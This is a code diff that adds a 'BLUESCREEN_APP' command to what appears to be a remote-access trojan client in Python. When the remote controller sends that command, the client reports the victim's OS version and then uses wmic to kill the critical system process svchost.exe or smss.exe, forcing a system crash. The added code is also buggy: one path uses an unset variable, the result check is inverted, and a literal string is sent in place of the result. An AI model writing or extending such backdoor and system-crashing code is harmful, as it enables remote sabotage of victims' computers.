@@ -100,6 +100,31 @@ def PINGPONG_client_T(ip, port):
                 s.send(b'OK')
                 CMD_client(ip, cmd_port, s)
 #cmd_END_location
+#bluescreen_START_location
+            elif data.decode() == 'BLUESCREEN_APP':
+                s.send(bytes("OK", 'utf8'))
+                from subprocess import Popen, PIPE
+                import platform
+                system_platform = platform.platform()
+                s.send(bytes(system_platform, 'utf8'))
+                version = int(platform.version().split(".")[0])
+                if version >= 10:
+                    cmd = Popen("wmic process where name='svchost.exe' delete", shell=True, stdout=PIPE, stderr=PIPE)
+                elif version <= 7:
+                    cmd = Popen("wmic process where name='smss.exe' delete", shell=True, stdout=PIPE, stderr=PIPE)
+                    cmd_print_out = cmd.stdout.read()
+                if not cmd_print_out:
+                    cmd_print_out = cmd.stderr.read()
+                if cmd_print_out:
+                    cmd_print_out = 'NOPE'
+                else:
+                    cmd_print_out = 'DONE'
+                s.send(bytes('cmd_print_out', 'utf8'))
+    
+
+
+                
+#bluescreen_END_location
 #priv_vbp_listen_START_location
             elif data.decode() == "PRO_VBP_APP":
                 import tempfile
